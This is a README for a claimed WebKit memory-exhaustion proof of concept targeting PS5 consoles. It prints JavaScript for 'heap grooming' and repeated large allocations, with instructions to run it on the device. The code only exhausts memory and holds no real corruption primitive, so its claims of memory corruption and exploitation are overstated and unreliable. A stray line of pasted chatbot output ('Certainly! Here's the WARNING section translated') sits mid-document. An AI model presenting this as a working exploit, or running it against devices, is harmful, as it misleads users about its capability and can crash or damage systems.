# Overflow WebKit Memory Leak PoC

## **DISCLAIMER**

**THIS REPOSITORY IS FOR TESTING PURPOSES ONLY!**  
A significant portion of this code might be incomplete or ineffective. If this vulnerability is ever fully exploited, it will likely be done by someone with far more expertise. I do not claim to be an expert in exploit development!

## Link
Follow this link for the exploit: [Overflow WebKit Memory Leak PoC](https://seregonwar.github.io/Overflow/)

## Description
This Proof of Concept (PoC) demonstrates a WebKit memory exhaustion exploit that I've been developing. It is functional in its current form but still requires full exploitation. Below, you'll find the JavaScript code that outlines how the PoC operates, along with an explanation of each step.

## How it Works
The code operates in five key steps:

1. **Heap Initialization**: Memory is allocated in a controlled manner to prepare for the attack.
2. **Heap Grooming**: The memory is manipulated to create gaps for exploit insertion.
3. **Memory Exhaustion**: The system's memory resources are continuously allocated and cleared to exhaust available memory.
4. **Payload Execution**: The exploit's payload is executed, triggering memory corruption.
5. **Exploit Execution**: All steps are run sequentially to trigger memory exhaustion and ultimately crash the system.

## Code

```javascript
// Step 1: Initialize Controlled Memory
function initializeHeap() {
    let buffers = [];
    for (let i = 0; i < 2048; i++) { // Reduced allocations
        buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
    }
    return buffers;
}

// Step 2: Groom the Heap
function groomHeap() {
    let tempArray = [];

    // Allocate and deallocate in patterns
    for (let i = 0; i < 2048; i++) { // Reduced iterations
        let buffer = new ArrayBuffer(1000); // Allocate smaller blocks
        tempArray.push(buffer);
    }

    // Deallocate some of the buffers to create holes in the heap
    for (let i = 0; i < 1512; i++) { // Fewer deallocations
        tempArray[i] = null; // Free up space to create holes in the heap
    }

    return tempArray;
}

// Step 3: Memory Exhaustion Function
function memExh() {
    let bufferArray = [];
    for (let i = 0; i < 2048; i++) { // Reduced iterations
        bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
        if (bufferArray.length > 512) { // Less aggressive clearing
            bufferArray = []; // Clear buffer array to exhaust memory
        }
    }
}

// Step 4: The Exploit Payload Function
function payload() {
    let largeString = "B".repeat(900000); // Smaller initial string
    let obj = {};
    let iterationCount = 0; // Counter to track the number of iterations

    while (true) {
        // String concatenation
        largeString += largeString;
        if (largeString.length > 100000000) { // Lower threshold for reset
            largeString = "B".repeat(900000); // Reset string to avoid overflow
        }
        memExh();
        iterationCount++;
        if (iterationCount > 64) break; // Control the number of iterations
    }
}

// Step 5: Perform the Exploit
function performExploit() {
    let controlledBuffers = initializeHeap(); // Initialize the heap
    let groomedHeap = groomHeap(); // Groom the heap

    // Start memory corruption
    memExh();

    // Run the payload
    payload();
}

// Execute the exploit
performExploit();
```

## Instructions

1. Copy and execute the above code on an exploitable PS5 (works up to version 9.60). This may not be applicable on PS4.
2. Remember, this is a PoC, and it should be used strictly for educational purposes.
3. Further testing and analysis are required to fully understand this vulnerability.
4. If needed, insert your custom payload inside the `payload` function.

## Disclaimer
This PoC is for educational purposes only. The author assumes no responsibility for any misuse of this code. 
Certainly! Here’s the **WARNING** section translated into English and formatted with markdown:

## **WARNING**

Running this Proof of Concept (PoC) comes with **serious risks** to the target device, including but not limited to:

1. **Device Bricking**: Incorrect or unmodified execution of this code could result in an **irreversible brick** of the system, rendering it completely unusable. This means the device might stop functioning entirely, with no chance of recovery.

2. **Data Loss**: This PoC exploits memory vulnerabilities, which could lead to file corruption or the loss of important data.

3. **Incompatibility**: The exploit may not work on all firmware versions or devices. Running it on an unsupported system version could cause unexpected and damaging consequences.

4. **Hardware Damage**: Continuous memory exhaustion and allocation could stress the hardware resources, potentially causing long-term physical damage to the device.

5. **Legal Risks**: Unauthorized use of exploits or vulnerabilities on devices you do not own, or without explicit consent, could violate local laws or licensing agreements.

**DO NOT** run this code on critical devices or on devices that you are not prepared to lose. Modify the PoC and fully understand its workings before executing it to minimize risks. **The author is not responsible for any damage caused by using this code.**


## Credit
The credits for the structure on which this tool is based were written by the aforementioned idebty, the credits are therefore assigned to him for having found the flaw, I have only expanded the operation!:
**Author**: [idebty](https://x.com/idebty?t=MT_ShLOs9wP9hcH3GNtkNA&s=09)  
